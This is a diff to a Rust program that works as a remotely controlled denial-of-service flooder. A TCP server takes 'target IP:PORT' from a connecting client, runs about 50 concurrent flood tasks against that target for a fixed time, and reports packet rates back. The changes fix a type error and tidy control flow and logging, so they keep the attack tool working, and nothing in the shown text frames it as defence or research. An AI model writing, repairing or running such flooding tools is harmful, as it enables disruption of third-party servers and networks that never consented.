@@ -4,6 +4,8 @@ use tokio::time::{sleep, Duration};
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use anyhow::Result;
+// Import the correct type for clarity
+use tokio::net::tcp::OwnedWriteHalf;
 
 const THREADS: usize = 50;
 const BURST_SIZE: usize = 5;
@@ -53,7 +55,8 @@ async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
 }
 
 // Helper function to safely write to stream with error handling
-async fn safe_write(writer: &mut tokio::io::WriteHalf<tokio::net::TcpStream>, message: &[u8]) -> Result<()> {
+// CORRECTED the type here to OwnedWriteHalf
+async fn safe_write(writer: &mut OwnedWriteHalf, message: &[u8]) -> Result<()> {
     match writer.write_all(message).await {
         Ok(_) => Ok(()),
         Err(e) if e.kind() == std::io::ErrorKind::BrokenPipe => {
@@ -65,16 +68,17 @@ async fn safe_write(writer: &mut tokio::io::WriteHalf<tokio::net::TcpStream>, me
 }
 
 async fn handle_client(stream: TcpStream) -> Result<()> {
+    // stream.into_split() returns OwnedReadHalf and OwnedWriteHalf
     let (reader, mut writer) = stream.into_split();
     let reader = BufReader::new(reader);
     let mut lines = reader.lines();
 
-    // Send welcome message (ignore if client already disconnected)
-    let _ = safe_write(&mut writer, b"Enter target IP:PORT\n").await;
+    let _ = safe_write(&mut writer, b"Enter target IP:PORT (or empty to quit)\n").await;
 
     while let Ok(Some(line)) = lines.next_line().await {
         if line.trim().is_empty() {
-            continue;
+            // User entered an empty line, so we break the loop and close the connection.
+            break;
         }
         
         if let Some((ip, port_str)) = line.trim().split_once(':') {
@@ -82,7 +86,6 @@ async fn handle_client(stream: TcpStream) -> Result<()> {
                 let target = format!("{}:{}", ip, port);
                 println!("Received target: {}", target);
                 
-                // Notify client (ignore if they disconnected)
                 let _ = safe_write(&mut writer, format!("Flooding target: {}\n", target).as_bytes()).await;
 
                 let packet_count = Arc::new(AtomicU64::new(0));
@@ -105,31 +108,25 @@ async fn handle_client(stream: TcpStream) -> Result<()> {
                 sleep(Duration::from_secs(DURATION_SECONDS)).await;
                 running.store(0, Ordering::Relaxed);
 
-                // Wait for all flood tasks to complete
                 for task in flood_tasks {
                     if let Err(e) = task.await {
                         eprintln!("Flood task error: {}", e);
                     }
                 }
                 
-                // Wait for monitor task
                 let _ = monitor_handle.await;
 
                 println!("Stopped for target: {}", target);
                 
-                // Notify client (ignore if they disconnected)
                 let _ = safe_write(&mut writer, format!("Stopped flood for target: {}\n", target).as_bytes()).await;
 
             } else {
-                // Invalid port (ignore if client disconnected)
                 let _ = safe_write(&mut writer, b"Invalid port number.\n").await;
             }
         } else {
-            // Invalid format (ignore if client disconnected)
             let _ = safe_write(&mut writer, b"Invalid format. Use IP:PORT.\n").await;
         }
         
-        // Prompt for next target
         let _ = safe_write(&mut writer, b"Enter target IP:PORT (or empty to quit)\n").await;
     }
     
@@ -148,7 +145,7 @@ async fn main() -> Result<()> {
                 println!("New connection from: {}", addr);
                 tokio::spawn(async move {
                     if let Err(e) = handle_client(stream).await {
-                        eprintln!("Error handling client: {}", e);
+                        eprintln!("Error handling client {}: {}", addr, e);
                     }
                 });
             }
